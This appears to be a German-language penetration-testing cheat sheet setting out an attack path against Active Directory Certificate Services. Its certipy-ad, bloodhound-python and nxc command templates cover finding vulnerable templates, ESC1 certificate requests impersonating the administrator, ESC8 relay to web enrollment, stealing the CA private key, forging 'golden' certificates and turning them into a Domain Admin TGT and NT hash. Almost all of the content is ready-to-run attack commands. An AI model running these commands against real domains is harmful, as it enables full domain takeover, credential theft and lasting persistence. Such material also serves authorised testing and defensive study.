# WEG

#plateform/linux #target/remote #cat/ADCS

% boris, adcs, certipy, recon, esc, esc1, esc8, vulnerable, find
## [ADCS-a] certipy-ad - ADCS Recon (vulnerable Templates ESC1-ESC11)
Start des adcs-Wegs. UPN noetig: -u user@domain (domain=FQDN). dc_ip = IP. Zeigt auch die CRL-URL (fuer forge).
```
certipy-ad find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip> -vulnerable -stdout
```

% boris, adcs, certipy, bloodhound, esc1, analyse, oldbloodhound
## [ADCS-b] certipy-ad - Find fuer BloodHound (ESC-Analyse, Ly4k Queries)
```
certipy-ad find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip> -old-bloodhound
```

% boris, adcs, bloodhound, collector, dump, esc1, python
## [ADCS-c] bloodhound-python - Dump (Users/Computer fuer ESC-Analyse)
-d domain=FQDN . -dc dc_fqdn=FQDN . -ns dc_ip=IP (DC ist DNS) . -u blank.
```
bloodhound-python -u <user> -p '<password>' -d <domain> -c all -dc <dc_fqdn> -ns <dc_ip> --zip
```

% boris, adcs, certipy, esc1, san, req, upn, template
## [ADCS-d] certipy-ad - ESC1 Cert anfordern (SAN/UPN = Administrator)
-ca = logischer CA-Name (CN). -target = CA-Host. Bei gepatchtem Env zusaetzlich -sid <victim_sid>.
```
certipy-ad req -u <user>@<domain> -p '<password>' -dc-ip <dc_ip> -ca <ca_name> -target <ca_fqdn> -template <template|ESC1> -upn administrator@<domain>
```

% boris, adcs, certipy, esc8, relay, kerberosauthentication, web, webenrollment
## [ADCS-e] certipy-ad - ESC8 Relay auf CA Web-Enrollment (URL-Schema)
Coerce den DC (siehe coerce-Weg) waehrend das hier laeuft. Alternative: ntlmrelayx --adcs (relay-Weg).
```
certipy-ad relay -target 'http://<ca_fqdn>' -template <template|KerberosAuthentication> -debug
```

% boris, adcs, certipy, ca, backup, goldencert, privatekey, capfx, cakey, persistence
## [ADCS-GC-a] certipy-ad - CA Cert+PrivKey sichern (Golden-Cert Schritt 1)
GOLDEN CERT: braucht lokale Admin-/Backup-Rechte auf dem CA-Host. -ca = CA CN. -target = CA-Host (IP ok, laeuft ueber NTLM/RPC). Ergebnis: <ca_name>.pfx (CA-Key). Danach beliebige Certs OFFLINE forgen.
```
certipy-ad ca -backup -ca <ca_name> -u <user>@<domain> -p '<password>' -target <ca_fqdn>
```

% boris, adcs, certipy, forge, goldencert, sid, upn, crl, forgecert, capfx, persistence
## [ADCS-GC-b] certipy-ad - Cert forgen (beliebiger User, offline; Golden-Cert Schritt 2)
-ca-pfx = aus Schritt GC-a (<ca_name>.pfx). -sid = Ziel-SID (DA endet auf -500; aus find/bloodhound/--get-sid). -crl = CRL-DP-URL der CA (aus ADCS-a). Ergebnis: administrator.pfx.
```
certipy-ad forge -ca-pfx <ca_name>.pfx -upn administrator@<domain> -sid <victim_sid> -crl '<crl_url>' -out administrator.pfx
```

% boris, adcs, certipy, auth, pfx, tgt, hash, pth, esc1, goldencert, creds
## [ADCS-f] certipy-ad - Auth mit .pfx -> TGT + NT-Hash (Domain Admin)
Schlusstritt fuer ESC1 UND Golden-Cert: PFX -> Kerberos-TGT + NT-Hash. User/Domain kommen aus dem PFX. -dc-ip = IP.
```
certipy-ad auth -pfx administrator.pfx -dc-ip <dc_ip>
```

% boris, adcs, certipy, sid, getsid, domainsid, nxc, forge
## [ADCS-hilf] SID des Ziels holen (fuer forge -sid)
Domain-SID + RID: DA = <domain_sid>-500. Alternativ steht die SID in bloodhound / certipy find.
```
nxc smb <dc_ip> -u <user> -p '<password>' -d <domain> --rid-brute | grep -i 'administrator\b'
```
